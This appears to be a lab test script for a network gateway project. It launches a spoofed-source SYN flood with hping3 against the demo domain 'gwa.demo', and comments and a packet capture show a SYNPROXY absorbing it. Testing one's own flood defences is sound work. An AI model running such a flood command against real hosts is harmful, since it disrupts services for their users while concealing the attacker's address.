#!/bin/bash

echo "SYN flooding from random sources the domain gwa.demo"
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source gwa.demo

# Description
# Attacker sends spoofed TCP SYN that are replied by the SYNPROXY which protects the RealmGateway
# No connection state is generated on our own, on either the Router or the RealmGateway
#
#19:15:06.650572 IP 34.101.106.255.9555 > 100.64.1.130.80: Flags [S], seq 1678891600:1678891720, win 64, length 120: HTTP
#19:15:06.650592 IP 100.64.1.130.80 > 34.101.106.255.9555: Flags [S.], seq 3897649470, ack 1678891601, win 0, length 0
#19:15:06.650678 IP 244.230.159.188.9556 > 100.64.1.130.80: Flags [S], seq 349629186:349629306, win 64, length 120: HTTP
#19:15:06.650691 IP 100.64.1.130.80 > 244.230.159.188.9556: Flags [S.], seq 3582025930, ack 349629187, win 0, length 0

